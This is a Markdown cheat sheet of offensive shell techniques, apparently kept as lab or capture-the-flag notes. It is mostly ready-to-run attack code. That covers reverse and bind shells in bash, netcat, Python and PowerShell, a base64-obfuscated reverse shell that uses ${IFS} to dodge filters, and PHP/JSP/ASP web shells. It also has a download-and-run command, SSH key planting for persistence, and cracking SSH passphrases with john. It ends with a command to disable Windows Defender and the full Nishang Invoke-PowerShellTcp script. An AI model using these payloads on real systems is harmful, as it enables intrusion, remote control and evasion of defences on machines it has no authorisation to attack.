# SHELL
## REVERSE SHELL
### OPEN:
- [Generator](https://www.revshells.com/)
- `sh -i >& /dev/tcp/10.10.14.5/9999 0>&1` Use in files(if the second one does not work)
- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.5 9999 >/tmp/f` Use in files

- `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'` Python 

- `https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php` PHP

- `If we can execute commands on the target, we can try to create MSFVenom payload and execute it inside target`

### SEND:
- `echo 'sh -i >& /dev/tcp/10.10.14.8/9999 0>&1' | base64 ` - Convert reverse shell to base64
- `echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC85OTk5IDA+JjEK"|base64${IFS}-d|bash` - Send the payload
- `bash -c("sh -i >& /dev/tcp/10.10.14.5/4444 0>&1")` - Execute the reverse shell

## WEB SHELL (https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
### OPEN:
- `<?php SYSTEM($_REQUEST['cmd']); ?>` PHP
- `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>` jsp
- `<% eval request("cmd") %>` asp
- https://github.com/BustedSec/webshell/blob/master/webshell.war java/war (Tomcat, Axis2, or WebLogic)

### SEND:
- `curl 10.10.11.116/shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.60/443 0>&1"'`
- `bash -c 'sh -i >%26 /dev/tcp/10.10.14.5/9999 0>%261'`

### UPLOAD REVERSE SHELL FILE
- `curl 10.10.14.8:9998/Exploit/bash.sh -o /tmp/bash.sh`
- `./tmp/bash.sh`
- `bash /tmp/bash.sh`

## LISTENING SHELL:
- `nc -lnvp 9999`

### Antak Webshell (https://github.com/samratashok/nishang/tree/master/Antak-WebShell)



## UPGRADE SHELL:
### STABILIZE:
#### /bin/sh -i
-`/bin/sh -i`

#### Perl
-`perl â€”e 'exec "/bin/sh";'`
- `perl: exec "/bin/sh";`

#### Ruby
- `ruby: exec "/bin/sh"`

#### Lua
- `lua: os.execute('/bin/sh')`

#### AWK
- `awk 'BEGIN {system("/bin/sh")}'`

#### Find
- `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`

#### Using Exec To Launch A Shell
- `find . -exec /bin/sh \; -quit`

#### VIM
- `vim -c ':!/bin/sh'`

##### Vim Escape
```
vim
:set shell=/bin/sh
:shell
```

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
"CTRL+Z"
stty raw -echo; fg
export TERM=xterm
```

### PROPER SHELL:
#### Victim
```
ssh-keygen
cd ./ssh
cat id_rsa.pub > authorized_keys
chmod 700 ~/
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_key
```

#### Host
- `nano id_rsa`
- (Copy from id_rsa victim)
- `chmod 400 id_rsa`
- `ssh -i id_rsa matt@10.10.11.136`

#### PASSPHRASE: 
```
python3 /usr/share/john/ssh2john.py id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
`john --show hash.txt`


# Bind Shells
## Server - Target starting Netcat listener
- `nc -lvnp 7777`

## Client - Attack box connecting to target
- `nc -nv 10.129.41.200 7777`

## Establishing a Basic Bind Shell with Netcat
### Server - Binding a Bash shell to the TCP session
- `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f`

### Client - Connecting to bind shell on target
- `nc -nv 10.129.41.200 7777`

# Reverse Shells
## Server - attack box
- `sudo nc -lvnp 443`

## Client - target (WINDOWS)
- `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.60',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

### Disable AV
- `Set-MpPreference -DisableRealtimeMonitoring $true`

```ps1
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
```